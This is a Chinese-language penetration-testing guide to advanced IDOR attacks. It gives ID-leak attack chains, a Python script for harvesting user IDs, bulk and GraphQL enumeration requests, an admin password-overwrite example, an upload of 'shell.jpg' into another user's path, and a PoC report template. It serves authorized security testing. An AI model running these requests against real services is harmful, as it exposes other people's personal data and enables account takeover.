# IDOR 高级模式

## 1. 多步 IDOR 链

很多 IDOR 需要先从一个接口获取 ID，再在另一个接口利用。系统化的 ID 泄露狩猎：

### ID 泄露源清单

| 泄露源 | 说明 | 猎取方式 |
|--------|------|----------|
| 评论/留言 | 评论者 user_id 常公开 | `GET /api/comments` 查看 author_id |
| 消息/通知 | 发送者/接收者 ID | `GET /api/messages` |
| 邀请链接 | 含 group_id/org_id | 分析邀请 URL 参数 |
| 分享链接 | 含 doc_id/file_id | 分析分享 URL 路径 |
| 公开列表 | 排行榜、成员列表 | `GET /api/leaderboard` |
| API 错误响应 | 报错信息含内部 ID | 故意发畸形请求 |
| GraphQL Introspection | 暴露所有对象类型和关系 | `query { __schema {...} }` |
| JS 前端代码 | 硬编码的 ID/路径 | 分析 JS bundle → `/skill:js-api-extract` |
| 导出文件 | CSV/Excel 含内部 ID | 下载报表分析列 |
| Webhook/回调 | 包含完整对象数据 | 注册 webhook 接收数据 |

### 典型攻击链

```
链路 1: 评论泄露 → 个人资料 → 订单数据
  GET /api/posts/1/comments → {"author_id": 1002, "text": "..."}
  GET /api/users/1002/profile → {"name":"张三", "email":"..."}
  GET /api/users/1002/orders → [{"id":5001, "amount":999}]

链路 2: 搜索泄露 → 管理操作
  GET /api/users/search?q=admin → {"results":[{"id":1,"username":"admin"}]}
  PUT /api/users/1/password → {"password":"hacked"}

链路 3: GraphQL 泄露 → 任意对象
  POST /graphql {"query":"{ __type(name:\"User\") { fields { name } } }"}
  → 发现 secretNote 字段
  POST /graphql {"query":"{ user(id:1) { secretNote } }"}

链路 4: 文件名猜测 → 敏感文件
  GET /api/users/me/avatar → URL: /uploads/user_1001_avatar.jpg
  GET /uploads/user_1_avatar.jpg → 管理员头像（确认路径规律）
  GET /uploads/user_1002_resume.pdf → 他人简历
```

### ID 收集自动化

```python
import requests, re, json

def harvest_ids(base_url, token):
    """从多个端点收集所有可见的用户 ID"""
    headers = {"Authorization": f"Bearer {token}"}
    ids = set()
    
    # 从评论中收集
    r = requests.get(f"{base_url}/api/comments?limit=100", headers=headers)
    if r.ok:
        for c in r.json().get("data", []):
            for key in ["author_id", "user_id", "uid", "created_by"]:
                if key in c:
                    ids.add(c[key])
    
    # 从搜索中收集
    for q in ["a", "e", "i", "admin", "test"]:
        r = requests.get(f"{base_url}/api/users/search?q={q}", headers=headers)
        if r.ok:
            for u in r.json().get("results", []):
                if "id" in u:
                    ids.add(u["id"])
    
    # 从公开列表收集
    for endpoint in ["/api/leaderboard", "/api/members", "/api/users"]:
        r = requests.get(f"{base_url}{endpoint}?limit=100", headers=headers)
        if r.ok:
            data = r.json()
            if isinstance(data, list):
                items = data
            else:
                items = data.get("data", data.get("results", []))
            for item in items:
                if isinstance(item, dict) and "id" in item:
                    ids.add(item["id"])
    
    return sorted(ids)
```

---

## 2. 文件/媒体资源 IDOR

文件 IDOR 的特殊性：应用层有权限检查，但文件存储层（S3/OSS/本地）往往直接暴露。

### 可预测文件名模式

| 模式 | 示例 | 遍历方式 |
|------|------|----------|
| 自增编号 | `report-001.pdf` | 遍历 001-999 |
| 用户ID+类型 | `user_1001_avatar.jpg` | 改用户 ID |
| 时间戳 | `backup-20260101.sql` | 遍历日期 |
| UUID v1 | `6ba7b810-9dad-...` | v1 含时间戳，可推算范围 |
| 短哈希 | `a1b2c3.jpg` | 如果只有 6 位十六进制 → 可爆破 |

### 云存储直链测试

```bash
# S3 存储桶
GET https://bucket.s3.amazonaws.com/users/1001/document.pdf → 自己的
GET https://bucket.s3.amazonaws.com/users/1002/document.pdf → 别人的？

# 阿里云 OSS
GET https://bucket.oss-cn-hangzhou.aliyuncs.com/uploads/1001/file.docx
GET https://bucket.oss-cn-hangzhou.aliyuncs.com/uploads/1002/file.docx

# 签名 URL 分析
# 如果 URL 含 ?Signature=xxx&Expires=xxx，检查：
# 1. 去掉签名参数能否直接访问
# 2. 修改路径但保留签名能否访问其他文件
# 3. 签名过期时间是否过长（永不过期的签名=永久访问）
```

### 上传路径 IDOR

```bash
# 上传时指定目标路径
POST /api/upload -F "file=@shell.jpg" -F "path=/users/1002/"
# 如果可以控制上传路径 → 覆盖他人文件

# 上传回调泄露路径
POST /api/upload → {"url":"/tmp/uploads/abc123/file.pdf"}
# 分析路径规律，尝试遍历其他用户的上传目录
```

---

## 3. 批量操作 IDOR

批量端点是权限检查的重灾区——开发者通常对单条做了鉴权，但批量接口完全跳过。

### 常见批量端点

```bash
# REST 批量
POST /api/users/bulk      {"ids": [1, 2, 3, 1002]}
POST /api/orders/export   {"order_ids": [5001, 5002]}
DELETE /api/messages/batch {"message_ids": [101, 102, 103]}
PATCH /api/items/bulk-update [{"id":1,"status":"sold"},{"id":2,"status":"sold"}]

# GraphQL 批量查询
POST /graphql
[
  {"query": "{ user(id:\"1\") { name email phone } }"},
  {"query": "{ user(id:\"2\") { name email phone } }"},
  {"query": "{ user(id:\"3\") { name email phone } }"}
]

# GraphQL aliases（单请求多 ID）
POST /graphql
{"query": "{ u1:user(id:\"1\"){email} u2:user(id:\"2\"){email} u3:user(id:\"3\"){email} }"}

# 数组型参数（URL）
GET /api/users?id=1&id=2&id=3&id=1002
GET /api/users?ids[]=1&ids[]=2&ids[]=1002
```

### 批量操作检测脚本

```python
import requests

def test_bulk_idor(base_url, token, my_id, victim_ids):
    """测试批量端点是否有 IDOR"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # 混入自己的 ID（合法）和他人的 ID（越权）
    all_ids = [my_id] + victim_ids
    
    bulk_endpoints = [
        ("POST", "/api/users/bulk", {"ids": all_ids}),
        ("POST", "/api/data/export", {"user_ids": all_ids}),
        ("GET", f"/api/users?ids={','.join(map(str, all_ids))}", None),
    ]
    
    for method, path, body in bulk_endpoints:
        try:
            if method == "GET":
                r = requests.get(f"{base_url}{path}", headers=headers, timeout=10)
            else:
                r = requests.request(method, f"{base_url}{path}",
                                   headers=headers, json=body, timeout=10)
            print(f"{method} {path} → {r.status_code} ({len(r.content)} bytes)")
            if r.ok and len(r.content) > 100:
                print(f"  ⚠️ 返回数据较多，可能包含他人数据")
        except Exception as e:
            print(f"{method} {path} → ERROR: {e}")
```

---

## 4. 间接引用 IDOR

不用数字 ID，用其他标识符（email、phone、username）也能越权：

### 间接标识符列表

| 标识符 | 示例 | 可枚举性 |
|--------|------|----------|
| 邮箱 | `victim@test.com` | 社工/泄露库 |
| 手机号 | `13800138001` | 遍历号段 |
| 用户名 | `john_doe` | 公开列表/搜索 |
| 工号/学号 | `EMP-2024-001` | 有规律，可猜测 |
| 订单号 | `ORD-20260101-001` | 时间+序号 |
| 身份证号 | `110101200001011234` | 社工 |

### 枚举手法

```bash
# 邮箱枚举（通过注册/密码重置的不同响应推断）
POST /api/register {"email":"test@test.com"} → "邮箱已存在" = 有效
POST /api/register {"email":"xxx@test.com"}  → "注册成功" = 无效

# 手机号枚举
POST /api/check-phone {"phone":"13800138001"} → {"exists": true}
POST /api/check-phone {"phone":"13800138002"} → {"exists": false}

# 用户名 → 个人资料
GET /api/profile/john_doe → 返回他人完整资料
GET /api/profile/admin    → 管理员资料

# 密码重置越权
POST /api/reset-password {"email":"victim@test.com"}
# 如果重置链接/验证码发到攻击者可见的地方 → 接管账户
```

---

## 5. 框架特征 IDOR

### Spring Data REST
```bash
# 自动暴露所有 JPA entity 的 CRUD 端点
GET /api/users           → 所有用户列表（默认无权限）
GET /api/users/1         → 特定用户
GET /api/users/1/orders  → 用户的关联订单
GET /api/profile         → HAL Explorer 暴露所有端点

# Spring Actuator 辅助
GET /actuator/mappings   → 暴露所有 URL 映射
GET /actuator/beans      → 暴露所有 Bean（含 Repository 名）
```

### Django REST Framework
```bash
# ViewSet 默认开放，忘加 permission_classes
GET /api/users/?format=json  → 用户列表
GET /api/users/1/?format=api → 带 HTML 的 API 浏览器（信息泄露）

# 过滤器参数
GET /api/users/?role=admin   → 过滤管理员
GET /api/users/?email=admin@test.com → 按邮箱查
```

### Laravel
```bash
# Route Model Binding 自动根据 {id} 查询
GET /api/users/1    → User::find(1) 无权限检查
GET /api/orders/1   → Order::find(1)

# 软删除数据
GET /api/users/1?withTrashed=true → 可能返回已删除的用户
```

### GraphQL
```bash
# Relay Global ID（Base64 编码的 type:id）
echo "VXNlcjox" | base64 -d  → "User:1"
echo "VXNlcjoy" | base64 -d  → "User:2"

# node() 接口通常缺少权限检查
POST /graphql {"query":"{ node(id:\"VXNlcjox\") { ... on User { email phone } } }"}

# Introspection 暴露所有可查询字段
POST /graphql {"query":"{ __schema { types { name fields { name } } } }"}
# 发现隐藏字段如 secretAnswer, ssn, creditCard
```

### Express + Mongoose
```bash
# 中间件顺序问题：认证中间件在路由之后
# 或 .populate() 泄露关联数据
GET /api/users/1?populate=orders,payments,addresses
# 通过 populate 参数拉出所有关联数据
```

---

## 6. 证据收集规范

### 最小有效 PoC 模板

```markdown
## IDOR - [水平/垂直]越权 - [端点路径]

**漏洞类型**: IDOR (Insecure Direct Object Reference)
**严重性**: [HIGH/CRITICAL]
**影响**: [能读取他人数据 / 能修改他人数据 / 能接管他人账户]

### 复现步骤

1. 注册两个账户：A (uid=1001) 和 B (uid=1002)
2. 用 A 的 token 请求 B 的数据

### 请求

```
GET /api/users/1002/profile HTTP/1.1
Host: target.com
Authorization: Bearer <A_TOKEN>
```

### 响应

```
HTTP/1.1 200 OK
{"id":1002, "name":"B用户", "email":"b@test.com", "phone":"138xxxx"}
```

### 证明

- 请求中使用 A 的 token (uid=1001)
- 请求的路径是 B 的 ID (1002)
- 响应返回了 B 的个人数据（姓名、邮箱、手机号）
- 确认非自己数据：A 的邮箱是 a@test.com，响应中是 b@test.com
```

### 证据质量检查清单

- [ ] 请求中包含完整的认证头（证明是谁在请求）
- [ ] 请求中的 ID/标识符 ≠ 当前登录用户
- [ ] 响应中的数据明确属于另一个用户（有具体的数据差异）
- [ ] 如果只有状态码差异，额外证明数据确实不同（Content-Length、Body）
- [ ] 写操作 IDOR 需要验证修改确实生效（再次查询确认）
